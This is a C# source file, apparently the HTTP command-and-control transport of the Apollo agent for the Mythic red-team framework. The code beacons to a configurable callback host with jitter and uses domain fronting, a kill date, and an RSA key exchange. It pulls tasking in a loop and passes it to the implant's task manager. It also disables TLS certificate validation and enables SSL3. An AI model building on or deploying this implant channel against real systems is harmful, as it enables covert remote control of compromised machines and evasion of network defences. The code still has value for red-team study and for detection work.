using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using ApolloInterop.Enums.ApolloEnums;

namespace HttpTransport
{
    public class HttpProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string ProxyHost;
        private string ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string DomainFront;
        private string KillDate;
        private string UserAgent;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;

        private bool _uuidNegotiated = false;

        public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            PostUri = data["post_uri"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            ProxyHost = data["proxy_host"];
            ProxyPort = data["proxy_port"];
            if (!string.IsNullOrEmpty(ProxyPort))
            {
                ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
            }
            else
            {
                ProxyAddress = ProxyHost;
            }
            Endpoint = string.Format("{0}:{1}/{2}", CallbackHost, CallbackPort, PostUri);
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];
            DomainFront = data["domain_front"];
            KillDate = data["killdate"];
            UserAgent = data["USER_AGENT"];

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            WebRequest.DefaultWebProxy = null;
            if (!string.IsNullOrEmpty(ProxyHost) &&
                !string.IsNullOrEmpty(ProxyUser) &&
                !string.IsNullOrEmpty(ProxyPass))
            {
                try
                {
                    Uri host = new Uri(ProxyHost);
                    ICredentials creds = new NetworkCredential(ProxyUser, ProxyPass);
                    WebRequest.DefaultWebProxy = new WebProxy(host, true, null, creds);
                } catch
                {
                    WebRequest.DefaultWebProxy = null;
                }
            }
            Agent.SetSleep(CallbackInterval, CallbackJitter);
        }

        public void Start()
        {
            bool first = true;
            while(Agent.IsAlive())
            {
                bool bRet = GetTasking(delegate (MessageResponse resp)
                {
                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
                });

                if (!bRet)
                {
                    break;
                }

                Agent.Sleep();
            }
        }

        private bool GetTasking(OnResponse<MessageResponse> onResp)
        {
            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
            {
                return SendRecv<TaskingMessage, MessageResponse>(msg, onResp);
            });
        }

        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("HttpProfile does not support Send only.");
        }

        public bool Recv<T>(OnResponse<T> onResponse)
        {
            throw new Exception("HttpProfile does not support Recv only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            throw new NotImplementedException("HttpProfile does not support Recv only.");
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            string sMsg = Serializer.Serialize(message);
            byte[] requestPayload = Encoding.UTF8.GetBytes(sMsg);
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
            request.KeepAlive = false;
            request.Method = "Post";
            request.ContentType = "text/plain";
            request.ContentLength = requestPayload.Length;
            request.UserAgent = UserAgent;
            if (DomainFront != "" && DomainFront != "domain_front")
                request.Host = DomainFront;
            Stream reqStream = request.GetRequestStream();
            reqStream.Write(requestPayload, 0, requestPayload.Length);
            reqStream.Close();
            try
            {
                WebResponse response = request.GetResponse();
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    onResponse(Serializer.Deserialize<TResult>(reader.ReadToEnd()));
                }
                return true;
            } catch
            {
                return false;
            }
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);

                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
                {
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            string msg = Serializer.Serialize(checkinMsg);
            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                if (!_uuidNegotiated)
                {
                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                    _uuidNegotiated = true;
                }
                return onResp(mResp);
            });
        }

    }
}
